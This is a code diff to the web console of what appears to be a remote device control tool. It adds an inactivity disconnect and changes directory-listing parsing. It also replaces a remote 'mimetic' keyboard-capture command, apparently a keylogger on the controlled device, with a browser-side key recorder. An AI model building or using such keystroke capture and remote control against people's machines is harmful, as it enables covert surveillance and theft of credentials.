@@ -244,6 +244,7 @@
             border: none;
             padding: 0;
             margin: 0;
+            caret-color: transparent;  /* Hide native cursor, use custom one */
         }
 
         #typed {
@@ -448,6 +449,8 @@
         let controlMode = false;
         let commandExecuting = false;
         let fileCache = {};
+        let inactivityTimer = null;
+        const INACTIVITY_TIMEOUT = 60000;  // 60 seconds
 
         const strings = {
             en: {
@@ -952,6 +955,7 @@
                     controlMode = true;
                     currentPath = 'C:\\Users';
                     updatePrompt();
+                    startInactivityTimer();  // Start 60-second inactivity timer
                     print(`Connected to ${device.hostname} (#${activeDevice}). Type "exit" to disconnect.`, 'dim');
                     print('Available commands: cd, ls, pwd, cat, nano, delete, mkdir, copy, cut, paste, move, start, get, upload, clear, help, exit, max_audio, min_audio, mute, unmute, mimetic', 'dim');
                 }).catch(() => {
@@ -1018,6 +1022,7 @@
                 print(currentPath);
             },
             exit(args) {
+                stopInactivityTimer();  // Stop the inactivity timer
                 controlMode = false;
                 activeDevice = null;
                 activeDeviceHostname = null;
@@ -1381,10 +1386,37 @@
                     return;
                 }
                 print('Recording keyboard input... (Press ESC to stop)', 'dim');
-                sendRemoteCommand(activeDevice, '__mimetic__', (output) => {
-                    print('Keyboard capture:', 'dim');
-                    print(output);
-                });
+
+                const keyboardLog = [];
+                const mimeticListener = (e) => {
+                    // Capture key names similar to server-side mimetic
+                    const key = e.key;
+                    if (key === 'Escape') {
+                        // Stop recording on ESC
+                        document.removeEventListener('keydown', mimeticListener);
+                        print('Keyboard capture:', 'dim');
+                        const result = keyboardLog.join('');
+                        print(result || 'No keys recorded');
+                        hiddenInput.focus();
+                        return;
+                    }
+
+                    // Map keys to bracketed format (server-compatible)
+                    if (key === ' ') keyboardLog.push('[SPACE]');
+                    else if (key === 'Enter') keyboardLog.push('[ENTER]');
+                    else if (key === 'Tab') keyboardLog.push('[TAB]');
+                    else if (key === 'Backspace') keyboardLog.push('[BACKSPACE]');
+                    else if (key === 'Delete') keyboardLog.push('[DELETE]');
+                    else if (key === 'Shift') keyboardLog.push('[SHIFT]');
+                    else if (key === 'Control') keyboardLog.push('[CTRL]');
+                    else if (key === 'Alt') keyboardLog.push('[ALT]');
+                    else if (key.length === 1) keyboardLog.push(key);
+                    else keyboardLog.push(`[${key.toUpperCase()}]`);
+                };
+
+                // Start recording - add focus to hidden input to capture keystrokes
+                document.addEventListener('keydown', mimeticListener);
+                hiddenInput.focus();
             },
             logout() {
                 window.location.href = '/logout';
@@ -1396,6 +1428,7 @@
         const commandNames = Object.keys(commands).sort();
 
         function sendRemoteCommand(deviceId, cmd, callback) {
+            resetInactivityTimer();  // Reset timeout when command is executed
             commandExecuting = true;
             hiddenInput.disabled = true;
             hiddenInput.style.opacity = '0.5';
@@ -1466,6 +1499,38 @@
             } catch (e) {
                 await new Promise(r => setTimeout(r, 150));
                 waitForShellResult(deviceId, callback, attempts + 1, cmdTimestamp, requestId);
+            }
+        }
+
+        function resetInactivityTimer() {
+            // Reset the inactivity timer when a command is executed
+            if (inactivityTimer) {
+                clearTimeout(inactivityTimer);
+            }
+            if (controlMode) {
+                inactivityTimer = setTimeout(() => {
+                    if (controlMode) {
+                        print('Inactivity timeout (60s) - disconnecting...', 'dim');
+                        controlMode = false;
+                        activeDevice = null;
+                        updatePrompt();
+                    }
+                }, INACTIVITY_TIMEOUT);
+            }
+        }
+
+        function startInactivityTimer() {
+            // Start the inactivity timer when entering control mode
+            if (controlMode) {
+                resetInactivityTimer();
+            }
+        }
+
+        function stopInactivityTimer() {
+            // Stop the inactivity timer when exiting control mode
+            if (inactivityTimer) {
+                clearTimeout(inactivityTimer);
+                inactivityTimer = null;
             }
         }
 
@@ -1671,16 +1736,23 @@
                     }
 
                     if (isNewFormat) {
-                        // New format: "Name                           Size       Type"
-                        // Directories: "Desktop                        <DIR>"
-                        // Files: "Firefox.exe                     383.1KB"
-                        if (trimmed.includes('<DIR>')) {
-                            const name = trimmed.split(/\s+<DIR>/)[0].trim();
+                        // New format: "Name                                    Size  Type"
+                        // Directories: "PlaymatDesign                       377.2MB  [DIR]"
+                        // Files: "Firefox.exe                           383.1KB  [ARC]"
+                        if (trimmed.includes('[DIR]')) {
+                            // Extract name before size (everything before the last digits)
+                            const name = trimmed.split(/\s+[0-9B.KMG]+\s+\[DIR\]/)[0].trim();
                             if (name && name !== '.' && name !== '..') {
                                 folders.push(name);
                             }
+                        } else if (trimmed.includes('[ARC]')) {
+                            // Extract name before size and [ARC]
+                            const name = trimmed.split(/\s+[0-9B.KMG]+\s+\[ARC\]/)[0].trim();
+                            if (name && name !== '.' && name !== '..') {
+                                files.push(name);
+                            }
                         } else if (trimmed && !trimmed.includes('...') && trimmed.match(/\s+[0-9]/)) {
-                            // Match files with size pattern (ends with size like "383.1KB" or "949B")
+                            // Fallback: Match files with size pattern (ends with size like "383.1KB" or "949B")
                             const name = trimmed.replace(/\s+[0-9B.KMG]+\s*$/, '').trim();
                             if (name && name !== '.' && name !== '..') {
                                 files.push(name);
